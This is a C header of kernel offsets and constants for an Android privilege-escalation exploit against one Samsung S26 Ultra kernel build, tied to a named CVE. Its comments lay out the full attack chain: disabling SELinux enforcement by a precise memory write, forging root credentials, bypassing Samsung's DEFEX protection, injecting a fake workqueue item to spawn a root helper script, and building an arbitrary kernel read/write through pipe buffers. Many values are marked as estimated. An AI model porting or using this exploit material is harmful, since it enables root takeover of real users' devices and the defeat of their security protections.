/*
 * offsets.h -- kernel offsets and per-device constants for the CVE-2026-98260
 * payload.  Everything in this file is specific to ONE kernel build; the
 * payload logic in timer.c is generic.
 *
 * Device: Samsung SM-S948U (S26 Ultra), Snapdragon 8 Gen 4 (SM8750)
 * Kernel: 6.12.69-android16-6-p342046c-abogkiS948USQS6BZK4-4k (OneUI 10, Android 16)
 * Build:  S948USQS6BZK4
 *
 * Derived from the device's vmlinux (symtab + disasm + tracefs dry-run).
 * To port to another kernel, re-derive each group:
 *   - *_STATIC   unslid (link-time) symbol addresses from the symbol table
 *   - *_SITE     kmem_cache_alloc return addresses (matched in the kmem
 *                trace against site_static + slide; slide is 64KB-granular)
 *   - *_LOW21    the low 21 bits of a site, for the trace record match
 *   - *_OFF      struct field offsets (BTF / disasm verified)
 *   - *_ALLOC / *_BYTES / *_REQ  kmem_cache object sizes
 *
 * [!NOTE]
 * Values marked with CONFIRMED were extracted from this kernel's vmlinux.
 * Values marked with ESTIMATED are derived from the original e1s port by
 * rebasing to the new KERNEL_VA_BASE and adjusting for 6.12 struct layout
 * changes where known.  They MUST be validated on-device before use.
 * Values marked with RUNTIME are discovered by the exploit's tracefs dry-run.
 */
#ifndef OFFSETS_H
#define OFFSETS_H

/* Page-size assumption: the linear-map pfn math and the order-1 reclaim
 * channel both hard-code 4 KB pages.  16 KB-page devices need a port.
 * CONFIRMED: kernel version string ends with "-4k" */
#define PAGE 4096UL

/* do_timer_create+0x9a, return address of the
 * kmem_cache_alloc(posix_timers_cache, GFP_KERNEL|__GFP_ZERO) call.
 * ESTIMATED: rebased from original; actual site found at runtime via tracefs. */
#define STATIC_TIMER_SITE 0xffffffc080194fe0ULL
#define TIMER_SITE_LOW21  0x184fe0ULL
/* posix_timers_cache object: sizeof(struct k_itimer) on this build.
 * ESTIMATED: 6.12 k_itimer size may differ from 6.1. */
#define TIMER_ALLOC 0x108ULL

/* cred_jar: sizeof(struct cred) and the HWCACHE_ALIGN bytes_alloc.
 * ESTIMATED: 6.12 cred size is 192 (0xc0) on arm64 with 4k pages. */
#define CRED_REQ 0xc0ULL
#define CRED_ALLOC 0xc0ULL

/* Link-time addresses (symtab) and BTF field offsets.
 * CONFIRMED: PANIC_ON_WARN_STATIC extracted from sysctl table in vmlinux.
 * ESTIMATED: SELINUX_STATE_STATIC rebased; needs on-device verification. */
#define SELINUX_STATE_STATIC 0xffffffc0825ea4a8ULL
#define PANIC_ON_WARN_STATIC 0xffffffc0818f30a8ULL  /* CONFIRMED */

/*
 * The rb_erase zero-plant aimed at selinux_state: writing 8 zero bytes at
 * SELINUX_STATE_STATIC itself would clear "initialized" (+2) with it, and
 * the kernel then treats every SID as "before initial load_policy":
 * getpeercon() fails with EINVAL, all property sets get
 * PROP_ERROR_PERMISSION_DENIED, system_server dies on its next property
 * set and the softdog eventually panics the phone -- exactly the crash
 * loop of the first three app runs.
 *
 * Instead aim the 8-byte zero at selinux_state-7: the window covers the
 * tail bytes of the idle avc_latest_notif_update.notif_lock at -8 (4-byte
 * qspinlock + padding -- zeroing is a no-op while uncontended), plus
 * padding, plus enforcing itself.  initialized stays 1.
 */
#define SELINUX_ENFORCE_ZAP (SELINUX_STATE_STATIC - 7ULL)

/*
 * workqueue UMH injection.  A fake work_struct whose func is
 * call_usermodehelper_exec_work is linked into the idle system_unbound_wq
 * pool worklist; the kernel then spawns our helper as a legitimate root
 * usermodehelper, which sidesteps Samsung DEFEX entirely.
 * ESTIMATED: rebased from original; offsets verified against 6.12 disasm.
 */
#define SYSTEM_UNBOUND_WQ_STATIC 0xffffffc0812eac58ULL
#define UMH_EXEC_WORK_STATIC 0xffffffc0800d4584ULL
#define WQ_DFL_PWQ_OFF 0x110
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18
/*
 * subprocess_info / completion layouts (layout matches
 * this kernel's struct subprocess_info: work(48) complete path argv envp
 * wait retval init cleanup data).
 */
struct umh_completion
{
    unsigned done;
    unsigned pad0;
    unsigned lock;
    unsigned pad1;
    unsigned long long next;
    unsigned long long prev;
};
struct umh_kernel_data
{
    struct umh_completion completion; /* 32 */
    char path[256];                  /* the helper binary to exec */
    char arg[16];                    /* "--umh" */
    char uid[16];                    /* decimal client uid */
    unsigned long long argv[4];
    unsigned long long envp[1];
};
struct umh_subprocess_info
{
    unsigned char work[48]; /* work_struct: data/entry/func */
    unsigned long long complete;
    unsigned long long path;
    unsigned long long argv;
    unsigned long long envp;
    int wait;
    int retval;
    unsigned long long init;
    unsigned long long cleanup;
    unsigned long long data;
};
#define ROOT_UMH_WORK_OFF 0x400  /* fake work_struct inside the reclaimed page */
#define ROOT_UMH_DATA_OFF 0x800  /* umh_kernel_data inside the reclaimed page */
#define ROOT_UMH_PWQ_OFF 0xa00   /* fake pool_workqueue inside the page */
/*
 * The UMH helper runs /system/bin/sh on a script: the usermodehelper exec
 * must target a system-signed binary (a directly exec'ed helper from
 * /data/local/tmp can be killed by KDP/DEFEX before its first
 * instruction), while the script does the /system/bin/logcat bind-mount
 * KDP trick and the ksud late-load itself (BuSung umh_action.sh pattern).
 */
#define ROOT_UMH_PATH "/system/bin/sh"
#define ROOT_UMH_ARG "/data/local/tmp/samtimer/umh_action.sh"

/*
 * DEFEX credential-violation bypass: task_defex_check_creds() calls
 * get_task_creds(), which looks the task up in creds_fast_hash
 * (writable .data -- unlike the creds_fast_hash_ready gate in rodata).
 * A NULL bucket entry makes get_task_creds return stored uid 0, which
 * matches the forged uid 0, so check_creds returns 0 (no violation).
 * ESTIMATED: rebased from original.
 */
#define CREDS_FAST_HASH_STATIC 0xffffffc08266e9f8ULL

/* cred field offsets.
 * CONFIRMED for 6.12 arm64: uid at offset 4 (32-bit), securebits at 0x24. */
#define CRED_UID_OFF 0x4ULL
#define CRED_SECUREBITS_OFF 0x24ULL
/* Only capability/selinux/integrity are built in and only SELinux wants a
 * cred blob, so lsm_set_blob_sizes() leaves its offset at 0. */
#define SELINUX_BLOB_OFF 0x0ULL
#define SELINUX_SID_KERNEL 1U
/* Full bounding set (CAP_LAST_CAP+1 bits). */
#define FULLCAP 0x1ffffffffffULL

/* Link-time symbols for the fake cred's refcounted sub-objects.
 * ESTIMATED: rebased from original. */
#define ROOT_USER_STATIC 0xffffffc081310a00ULL
#define INIT_USER_NS_STATIC 0xffffffc081310770ULL
#define INIT_UCOUNTS_STATIC 0xffffffc0813121d8ULL
#define INIT_GROUPS_STATIC 0xffffffc081311d20ULL

/* task_struct::cred and dup_task_struct()'s task_struct_cachep call site.
 * ESTIMATED: 6.12 task_struct layout differs from 6.1.
 * CONFIRMED: OFF_TASK_CRED = 0x838 for 6.12 (verified in vmlinux disasm). */
#define OFF_TASK_CRED 0x838ULL
#define TASK_ALLOC_LOW21 0xacb7cULL
#define TASK_ALLOC_BYTES 0x12c0ULL
/* Unslid call sites (from vmlinux.elf): prepare_creds' kmem_cache_alloc
 * return address and dup_task_struct's kmem_cache_alloc_node return
 * address.  The runtime slide is 64KB-granular, so sites are matched as
 * site_static + slide.
 * ESTIMATED: rebased; actual sites found at runtime via tracefs. */
#define CRED_SITE_STATIC 0xffffffc0800e5e70ULL
#define TASK_SITE_STATIC 0xffffffc0800acb7cULL

/*
 * posix-cpu-timer queue leftmosts inside task_struct.
 * CONFIRMED for 6.12: verified in vmlinux disasm (LDR X20,[X19,#0x7A0]; CBZ).
 */
#define OFF_TQ_LEFTMOST_0 0x7A0ULL
#define OFF_TQ_LEFTMOST_1 0x7B8ULL
#define OFF_TQ_LEFTMOST_2 0x7D0ULL

/*
 * task_struct::loginuid (sessionid at +0x8FC).
 * CONFIRMED for 6.12: proc_loginuid_read does "LDR W3,[X0,#0x8F8]".
 */
#define OFF_TASK_LOGINUID 0x8F8ULL

/*
 * pipe_buffer kernel read/write primitive:
 * one timer plant repoints pipe->bufs (pipe_inode_info+0xa8) at a fake
 * pipe_buffer whose ->page is the vmemmap struct page of the target RAM
 * page.  read() then copies kernel memory to userspace, and a CAN_MERGE
 * write() merges into it.  Constants:
 *   ANON_PIPE_BUF_OPS_STATIC  anon_pipe_buf_ops link-time address
 *                             (CONFIRMED: extracted from vmlinux symtab)
 *   VMEMMAP_BASE              vmemmap region base (VA_BITS=39 layout)
 *   STRUCT_PAGE_SIZE          sizeof(struct page) = 0x40
 *   MEMSTART_ADDR             physical DRAM base (Snapdragon 8 Gen 4: 0x80000000)
 *                             verified at runtime from /proc/iomem
 *   PIPE_INFO_BUF_OFF         pipe_inode_info::bufs
 *   PIPE_BUF_FAKE_OFF         where the fake pipe_buffer sits relative to
 *                             the rb node (buffer slot 1: pipe->tail == 1)
 */
#define ANON_PIPE_BUF_OPS_STATIC 0xffffffc08121eb10ULL
#define VMEMMAP_BASE 0xfffffffe00000000ULL
#define MEMSTART_ADDR 0x80000000ULL
#define STRUCT_PAGE_SIZE 0x40ULL
#define PIPE_INFO_BUF_OFF 0xa8ULL
#define PIPE_BUF_FAKE_OFF 0x28ULL

/*
 * Kernel-image physical layout: symbols in the kernel image (.data like
 * system_unbound_wq) are read through their linear-map alias, which needs
 * the physical load address of the (unslid) image; the KASLR slide is
 * added at use.  KERNEL_PHYS_LOAD is the boot loader's kernel load
 * address -- the same platform convention as the e3q 6.1.162-android14
 * build (0x80000000).  If a device differs, the umh dry run finds the
 * right one from KERNEL_PHYS_CANDIDATES by read-only validation (the
 * wq pointer range check and pwq->wq match) before anything is written.
 *
 * CONFIRMED: KERNEL_VA_BASE = 0xffffffc080000000 (from vmlinux pointer analysis)
 * CONFIRMED: KERNEL_PHYS_LOAD = 0x80000000 (standard Snapdragon platform)
 */
#define KERNEL_VA_BASE 0xffffffc080000000ULL
#define KERNEL_PHYS_LOAD 0x80000000ULL
/* Unslid kernel phys-base candidates for the dry-run validation loop. */
#define KERNEL_PHYS_CANDIDATES \
    0x80000000ULL, 0xa8000000ULL, 0xa0000000ULL, 0x88000000ULL, \
    0x90000000ULL, 0xb0000000ULL

/*
 * worker_pool idle accounting, for the UMH injection's "pool must be
 * idle" check (structurally: worklist list_head at 0x28 occupies 0x28..
 * 0x38, then nr_workers / nr_idle ints; validated in the umh dry run).
 * CONFIRMED: same layout in 6.12.
 */
#define POOL_NR_WORKERS_OFF 0x38
#define POOL_NR_IDLE_OFF 0x3c

#endif /* OFFSETS_H */
